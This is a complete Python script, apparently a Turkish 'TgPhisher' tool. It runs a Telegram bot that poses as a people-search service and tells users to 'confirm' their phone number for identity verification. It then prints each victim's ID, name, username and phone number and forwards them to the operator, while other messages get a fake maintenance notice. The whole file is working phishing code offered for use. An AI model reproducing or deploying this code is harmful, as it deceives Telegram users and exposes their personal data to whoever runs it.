import telebot
import os
import requests
from telebot import types
import colorama
from colorama import init, Fore, Style, Back

init()

red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN

yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT
def print_user_data(user_id, first_name, username=None, phone_number=None):
    border = "{:-^40}".format("")
    
    print(Fore.YELLOW + border + Style.RESET_ALL)
    print(Fore.GREEN + "    ID : " + Fore.WHITE + "{:<31}".format(user_id) + Style.RESET_ALL)
    print(Fore.GREEN + "    ismi : " + Fore.WHITE + "{:<29}".format(first_name) + Style.RESET_ALL)
    
    if username:
        print(Fore.GREEN + "    kullanıcı adı : " + Fore.WHITE + "{:<24}".format("@" + username) + Style.RESET_ALL)
    if phone_number:
        print(Fore.GREEN + "   kurbanın Telefon numarası : " + Fore.WHITE + "     {:<14}".format("+" + phone_number) + Style.RESET_ALL)
    print(Fore.YELLOW + border + Style.RESET_ALL)


os.system('cls' if os.name == 'nt' else 'clear')
print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
           {bold}{yellow}Telegram{reset}:{cyan} https://t.me/Osyteam

      ''')
def is_valid_token(token):

    try:
        bot = telebot.TeleBot(token)
        bot_info = bot.get_me()
        if bot_info:
            return True
    except telebot.apihelper.ApiException:
        return False

token = input(f"     {blue} Bot token girin >> ")
admin_id = input(f"     {blue} Telegram id girin >>")

if not is_valid_token(token):
    print("{reset}     Geçersiz token tekrar çalıştırın  ")

else:
    def get_bot_username(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url).json()
    
        if response.get("ok") and 'username' in response.get("result", {}):
            return response["result"]["username"]
        else:
            return None

    username = get_bot_username(token)
    if username:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
  
  {bold}{yellow}Telgraf{reset}: https://t.me/OnurTool

      ''')
        print(f"        Bot çalışıyor!{reset} - {red}çıkış için [ctrl + c]{reset}\n Botunuzun kullanıcı adı: {yellow}@{username}{reset}\n Hesabınızdan {yellow}- /start{reset} komutunu bota gönderin\n.")
    else:
        print(f"\n     Bot çalışıyor!{reset} - {red}çıkış için [ctrl + c]{reset}")
    bot = telebot.TeleBot(token)
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button_phone = types.KeyboardButton(text="Telefon numarasını onayla", request_contact=True)
        markup.add(button_phone)
    
        bot.send_message(message.chat.id, """
🗂 <b>Telefon numarası</b>
 <b>Kimliğinizi</b> tamamlamak için <b>telefon numaranızı</b> onaylamanız gerekir. Bunu yapmak için aşağıdaki düğmeye tıklayın.""", parse_mode="HTML", reply_markup=markup)

    @bot.message_handler(content_types=['contact'])
    def contact_handler(message):
        if message.contact is not None:
            if message.contact.user_id == message.from_user.id:
                markup = types.ReplyKeyboardRemove()
                bot.send_message(message.chat.id, f'''
⬇️ Giriş için komut örnekleri:

👤 İsimle arama
├  Blogger (Etikete göre arama)
├  Antipov Evgeniy Vyacheslavovich
└  Antipov Evgeniy Vyacheslavovich 05.02.1994
(Şu formatlar da kullanılabilir: 05.02 / 1994 / 28 / 20-28)

🚗 Araçla arama
├  Н777ОН777 - türkiye'de araç plakası ile arama
└  WDB4632761X337915 - VIN numarası ile arama

👨 Sosyal medya
├  instagram.com/ev.antipov - Instagram
├  vk.com/ id577744097 - VKontakte
├  facebook.com/profile.php?id=1 - Facebook
└  ok.ru/profile/162853188164 - Odnoklassniki

📱 79999939919 - Telefon numarasına göre arama
📨 tema@gmail.com - E-posta adresine göre arama
📧 #281485304, @durov veya bir mesaj ilet - Telegram hesabına göre arama

🔐 /pas churchill7 - Parolaya göre e-posta, giriş bilgisi ve telefon numarası arama
🏚 /adr ankara, izmir, d 1, kv 1 - Adrese göre bilgi arama (türkiye))
🏘 77:01:0001075:1361 -  numara ile arama

🏛 /company Sberbank - Şirket bilgileri arama
📑 /inn 784806113663 - Vergi Kimlik Numarası (INN) ile arama
🎫 /snils 13046964250 - Sosyal Güvenlik Numarası (SNILS) ile arama
📇 /passport 6113825395 - Pasaport numarası ile arama
🗂 /vy 9902371011 - Ehliyet numarası ile arama

📸 Bir kişinin fotoğrafını göndererek VK, OK gibi sitelerde benzerlerini bulabilirsiniz.
🚙 Araç plakasının fotoğrafını göndererek bilgi alabilirsiniz.
🙂 Bir çıkartma (sticker) göndererek yaratıcısını bulabilirsiniz.
🌎 Harita üzerinden bir konum göndererek bilgi alabilirsiniz.
🗣 Sesli komutlar kullanarak da arama yapabilirsiniz.

@OnurKurucu - @OnurTool
''', parse_mode="Markdown", reply_markup=markup)
                print()
                print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username, message.contact.phone_number)
                print()
                try:
                    bot.send_message(admin_id, f'''
h h h - {username}

- {message.from_user.id}
- {message.from_user.first_name}
- {message.from_user.username}
- {message.contact.phone_number}
- By @OnurKurucu ''')
                except:
                    print('     hata gönder sonra ADMIN_ID      ')
            else:
                    bot.send_message(message.chat.id, "Bu senin telefon numaran değil. Lütfen numaranızı onaylayın.")

    @bot.message_handler(func=lambda message: True)
    def default_handler(message):
        bot.send_message(message.chat.id, f'''
⚠️ Teknik çalışma.
Çalışmalar yakın zamanda tamamlanacak olup, tüm kullanıcılarımızın abonelikleri uzatılmıştır.
''', parse_mode="Markdown")
  

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"hata oluştu mınagoyim: {e}")
    